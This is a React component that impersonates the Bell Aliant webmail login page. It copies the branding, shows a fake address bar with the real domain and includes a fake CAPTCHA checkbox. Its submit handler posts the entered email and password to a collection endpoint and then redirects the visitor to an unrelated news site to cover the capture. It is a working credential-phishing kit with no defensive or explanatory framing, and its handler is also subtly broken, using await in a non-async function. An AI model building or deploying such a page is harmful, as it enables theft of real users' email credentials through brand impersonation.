import React, { useState } from 'react';

const BellAliantLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [captchaChecked, setCaptchaChecked] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
      try {
    const response = await fetch("/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email,
        password,
  
      }),
    });

    const data = await response.json();

    console.log("Sent successfully:", data);

  } catch (error) {
    console.error("Error sending data:", error);
  }

    // Redirect after login click
    window.location.href = "https://www.ctvnews.ca/local/";
  };

  return (
    <div className="min-h-screen bg-white flex flex-col font-sans">

      {/* Mobile Header */}
      <div className="md:hidden flex items-center justify-between px-4 py-3 bg-gray-100">
        <div className="w-8 h-8 flex items-center justify-center">
          <svg className="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
          </svg>
        </div>
        <span className="text-gray-800 font-medium text-sm truncate max-w-[200px]">
          webmail.bellaliant.net
        </span>
      </div>

      {/* Desktop Header */}
      <header className="hidden md:block bg-[#00549a] text-white">
        <div className="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="text-3xl font-bold">
            Bell<span className="font-light">Aliant</span>
          </div>
          <button className="text-white text-sm font-medium">
            Français
          </button>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex flex-col md:items-center md:justify-center md:bg-gray-50 md:py-12">
        <div className="w-full max-w-md md:max-w-lg mx-auto md:bg-white md:rounded-2xl md:shadow-xl md:p-12 md:border">

          <h1 className="text-2xl md:text-3xl font-bold text-center mb-8">
            Log in to Bell Aliant email
          </h1>

          <form onSubmit={handleSubmit} className="px-6 md:px-0 space-y-6">

            {/* Email */}
            <div className="relative w-full">
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="peer w-full block px-4 py-4 border-2 border-gray-300 rounded-lg focus:border-[#00549a] focus:outline-none bg-white text-gray-900"
                placeholder="Email address"
              />
            </div>

            {/* Password */}
            <div className="relative w-full">
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="peer w-full block px-4 py-4 border-2 border-gray-300 rounded-lg focus:border-[#00549a] focus:outline-none bg-white text-gray-900"
                placeholder="Password"
              />
            </div>

            {/* CAPTCHA */}
            <div className="border-2 border-gray-200 rounded-lg p-4 bg-gray-50">
              <div className="flex items-center space-x-3">
                <div
                  onClick={() => setCaptchaChecked(!captchaChecked)}
                  className={`w-8 h-8 border-2 rounded cursor-pointer flex items-center justify-center ${
                    captchaChecked ? 'bg-[#00549a] border-[#00549a]' : 'border-gray-400 bg-white'
                  }`}
                >
                  {captchaChecked && (
                    <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                    </svg>
                  )}
                </div>
                <span className="text-gray-700">I'm not a robot</span>
              </div>
            </div>

            {/* Button */}
            <button
              type="submit"
              className="w-full bg-[#003366] hover:bg-[#002244] text-white font-medium py-4 rounded-full text-lg"
            >
              Log in
            </button>

          </form>
        </div>
      </main>

    </div>
  );
};

export default BellAliantLogin;
